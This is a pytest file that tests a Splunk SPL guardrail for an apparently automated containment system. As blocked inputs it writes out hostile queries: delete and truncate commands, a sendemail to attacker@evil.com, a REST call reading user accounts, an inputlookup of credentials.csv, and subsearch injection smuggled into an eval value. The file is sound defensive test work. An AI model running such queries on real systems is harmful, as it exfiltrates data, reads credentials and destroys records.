"""
Tests for containment-specific SPL guardrail validation.
All deterministic — no LLM, Splunk, or Supabase calls.

Tests:
- validate_containment_spl_guardrail()  (containment-scoped public API)
- SPLGuardrail class validation/audit
- Layer 1: blocked keywords, subsearch injection, macro expansion
- Layer 2: index authorization (sentinel_actions only for collect)
- Containment-specific: collect must target sentinel_actions
- Integration: safe containment SPLs pass all layers
"""
import pytest
from app.guardrails.spl_guardrail import (
    validate_containment_spl_guardrail,
    validate_spl,
    is_safe,
    get_blocked_reason,
    SPLGuardrail,
    GuardrailResult,
)


# ---------------------------------------------------------------------------
# Helpers
# ---------------------------------------------------------------------------

def _safe_block_ip_spl(ip: str = "1.2.3.4") -> str:
    return (
        f'| makeresults | eval ip="{ip}", action="block", '
        f'type="network" | collect index=sentinel_actions'
    )


def _safe_isolate_host_spl(host: str = "win-server-01") -> str:
    return (
        f'| makeresults | eval host="{host}", action="isolate", '
        f'type="endpoint" | collect index=sentinel_actions'
    )


def _safe_kill_process_spl(process: str = "powershell.exe") -> str:
    return (
        f'| makeresults | eval process="{process}", action="kill" '
        f'| collect index=sentinel_actions'
    )


# ---------------------------------------------------------------------------
# TestValidateContainmentSplGuardrail — the containment-specific function
# ---------------------------------------------------------------------------

class TestValidateContainmentSplGuardrail:
    """Tests for validate_containment_spl_guardrail()."""

    def test_valid_block_ip_passes(self):
        result = validate_containment_spl_guardrail(_safe_block_ip_spl())
        assert result.is_blocked is False

    def test_valid_isolate_host_passes(self):
        result = validate_containment_spl_guardrail(_safe_isolate_host_spl())
        assert result.is_blocked is False

    def test_valid_kill_process_passes(self):
        result = validate_containment_spl_guardrail(_safe_kill_process_spl())
        assert result.is_blocked is False

    def test_collect_targeting_wrong_index_is_blocked(self):
        bad_spl = '| makeresults | eval ip="1.2.3.4" | collect index=botsv3'
        result = validate_containment_spl_guardrail(bad_spl)
        assert result.is_blocked is True
        # Layer 1 blocks | collect when NOT targeting sentinel_actions
        assert result.layer == 1

    def test_collect_targeting_sentinel_findings_is_blocked(self):
        bad_spl = (
            '| makeresults | eval user="bob" | collect index=sentinel_findings'
        )
        result = validate_containment_spl_guardrail(bad_spl)
        assert result.is_blocked is True
        # Layer 1 blocks | collect when NOT targeting sentinel_actions
        assert result.layer == 1

    def test_dangerous_keyword_delete_is_blocked(self):
        bad_spl = (
            '| makeresults | delete | collect index=sentinel_actions'
        )
        result = validate_containment_spl_guardrail(bad_spl)
        assert result.is_blocked is True
        assert result.layer == 1

    def test_subsearch_injection_is_blocked(self):
        bad_spl = (
            '| makeresults [search index=_internal] | collect index=sentinel_actions'
        )
        result = validate_containment_spl_guardrail(bad_spl)
        assert result.is_blocked is True
        assert result.layer == 1

    def test_backtick_macro_is_blocked(self):
        bad_spl = (
            '| makeresults `evil_macro` | collect index=sentinel_actions'
        )
        result = validate_containment_spl_guardrail(bad_spl)
        assert result.is_blocked is True
        assert result.layer == 1

    def test_inputlookup_is_blocked(self):
        bad_spl = (
            '| inputlookup credentials.csv | collect index=sentinel_actions'
        )
        result = validate_containment_spl_guardrail(bad_spl)
        assert result.is_blocked is True
        assert result.layer == 1

    def test_missing_index_is_blocked(self):
        bad_spl = '| makeresults | eval ip="1.2.3.4", action="block"'
        result = validate_containment_spl_guardrail(bad_spl)
        assert result.is_blocked is True
        assert result.layer == 2

    def test_result_is_guardrail_result_type(self):
        result = validate_containment_spl_guardrail(_safe_block_ip_spl())
        assert isinstance(result, GuardrailResult)


# ---------------------------------------------------------------------------
# TestValidateSplPassThrough — validate_spl() with containment-style queries
# ---------------------------------------------------------------------------

class TestValidateSplContainmentPassThrough:
    """Ensures validate_spl() also accepts properly formed containment SPL."""

    def test_block_ip_passes_validate_spl(self):
        result = validate_spl(_safe_block_ip_spl())
        assert result.is_blocked is False

    def test_isolate_host_passes_validate_spl(self):
        result = validate_spl(_safe_isolate_host_spl())
        assert result.is_blocked is False

    def test_blocked_keyword_truncate_blocked(self):
        spl = '| makeresults | truncate | collect index=sentinel_actions'
        result = validate_spl(spl)
        assert result.is_blocked is True
        assert "truncate" in result.reason.lower()

    def test_blocked_keyword_script_blocked(self):
        spl = '| makeresults | script run.py | collect index=sentinel_actions'
        result = validate_spl(spl)
        assert result.is_blocked is True

    def test_blocked_keyword_outputlookup_blocked(self):
        spl = '| makeresults | outputlookup results.csv | collect index=sentinel_actions'
        result = validate_spl(spl)
        assert result.is_blocked is True

    def test_blocked_term_sendemail_blocked(self):
        spl = '| makeresults | sendemail to=attacker@evil.com | collect index=sentinel_actions'
        result = validate_spl(spl)
        assert result.is_blocked is True

    def test_rest_command_blocked(self):
        spl = '| rest /services/auth/users | collect index=sentinel_actions'
        result = validate_spl(spl)
        assert result.is_blocked is True


# ---------------------------------------------------------------------------
# TestIsSafeConvenienceWrapper
# ---------------------------------------------------------------------------

class TestIsSafeConvenienceWrapper:
    """Tests for the is_safe() boolean convenience wrapper."""

    def test_valid_block_ip_is_safe(self):
        assert is_safe(_safe_block_ip_spl()) is True

    def test_dangerous_delete_is_not_safe(self):
        spl = '| makeresults | delete | collect index=sentinel_actions'
        assert is_safe(spl) is False

    def test_missing_index_is_not_safe(self):
        assert is_safe('| makeresults | eval x=1') is False

    def test_kill_process_spl_is_safe(self):
        assert is_safe(_safe_kill_process_spl()) is True


# ---------------------------------------------------------------------------
# TestGetBlockedReason
# ---------------------------------------------------------------------------

class TestGetBlockedReason:
    """Tests for get_blocked_reason() — returns human-readable block reason or None."""

    def test_safe_spl_returns_none(self):
        assert get_blocked_reason(_safe_block_ip_spl()) is None

    def test_dangerous_spl_returns_string(self):
        spl = '| makeresults | delete | collect index=sentinel_actions'
        reason = get_blocked_reason(spl)
        assert reason is not None
        assert isinstance(reason, str)
        assert "Layer 1" in reason

    def test_unauthorized_index_blocked_at_layer_1(self):
        # | collect index=malicious_index — Layer 1 blocks collect
        # that is not targeting sentinel_actions
        spl = '| makeresults | eval x=1 | collect index=malicious_index'
        reason = get_blocked_reason(spl)
        assert reason is not None
        assert "Layer 1" in reason


# ---------------------------------------------------------------------------
# TestSPLGuardrailClass
# ---------------------------------------------------------------------------

class TestSPLGuardrailClass:
    """Tests for the stateful SPLGuardrail object-oriented wrapper."""

    def test_validate_returns_guardrail_result(self):
        guardrail = SPLGuardrail()
        result = guardrail.validate(_safe_block_ip_spl())
        assert isinstance(result, GuardrailResult)
        assert result.is_blocked is False

    def test_validate_blocks_dangerous_spl(self):
        guardrail = SPLGuardrail()
        result = guardrail.validate(
            '| makeresults | delete | collect index=sentinel_actions'
        )
        assert result.is_blocked is True
        assert result.layer == 1

    def test_audit_appends_entry(self):
        guardrail = SPLGuardrail()
        spl = _safe_block_ip_spl()
        assert len(guardrail.audit_entries) == 0
        guardrail.audit(spl)
        assert len(guardrail.audit_entries) == 1
        assert spl in guardrail.audit_entries[0]

    def test_audit_accumulates_multiple_entries(self):
        guardrail = SPLGuardrail()
        guardrail.audit(_safe_block_ip_spl())
        guardrail.audit(_safe_isolate_host_spl())
        guardrail.audit(_safe_kill_process_spl())
        assert len(guardrail.audit_entries) == 3

    def test_audit_entry_contains_timestamp_marker(self):
        guardrail = SPLGuardrail()
        guardrail.audit(_safe_block_ip_spl())
        entry = guardrail.audit_entries[0]
        # All entries start with [ISO-timestamp]
        assert entry.startswith("[")
        assert "T" in entry  # ISO-8601 datetime contains 'T'

    def test_separate_instances_have_separate_audit_logs(self):
        g1 = SPLGuardrail()
        g2 = SPLGuardrail()
        g1.audit(_safe_block_ip_spl())
        assert len(g1.audit_entries) == 1
        assert len(g2.audit_entries) == 0


# ---------------------------------------------------------------------------
# TestContainmentGuardrailIntegration — end-to-end SPL scenarios
# ---------------------------------------------------------------------------

class TestContainmentGuardrailIntegration:
    """Integration scenarios: realistic containment SPL strings going through the guardrail."""

    def test_full_block_ip_with_metadata_passes(self):
        spl = (
            '| makeresults | eval ip="104.21.44.1", action="block", '
            'type="network", severity="high", reason="C2 node", '
            'investigation_id="inv-001", action_id="act-abc", '
            'confidence="0.95", phase="1" | collect index=sentinel_actions'
        )
        result = validate_containment_spl_guardrail(spl)
        assert result.is_blocked is False

    def test_full_disable_account_with_metadata_passes(self):
        spl = (
            '| makeresults | eval user="jdoe", action="disable", '
            'type="identity", investigation_id="inv-002", '
            'action_id="act-def" | collect index=sentinel_actions'
        )
        result = validate_containment_spl_guardrail(spl)
        assert result.is_blocked is False

    def test_prompt_injection_in_target_value_blocked(self):
        # SPL injection attempt via a crafted target value that introduces [search ...]
        spl = (
            '| makeresults | eval ip="1.2.3.4 [search index=_internal]" '
            '| collect index=sentinel_actions'
        )
        result = validate_containment_spl_guardrail(spl)
        assert result.is_blocked is True
        assert result.layer == 1

    def test_double_index_one_unauthorized_blocked(self):
        spl = (
            '| makeresults | eval x=1 '
            '| collect index=sentinel_actions '
            '| collect index=botsv3'
        )
        # botsv3 is permitted for search, but for collect it should not be used
        # The containment guardrail extra check fires on this
        result = validate_containment_spl_guardrail(spl)
        assert result.is_blocked is True

    def test_rotate_credentials_spl_passes(self):
        spl = (
            '| makeresults | eval user="api_svc_account", action="rotate", '
            'type="identity" | collect index=sentinel_actions'
        )
        result = validate_containment_spl_guardrail(spl)
        assert result.is_blocked is False

    def test_audit_cloudtrail_spl_passes(self):
        spl = (
            '| makeresults | eval resource="s3-prod-bucket", action="audit", '
            'type="cloudtrail" | collect index=sentinel_actions'
        )
        result = validate_containment_spl_guardrail(spl)
        assert result.is_blocked is False
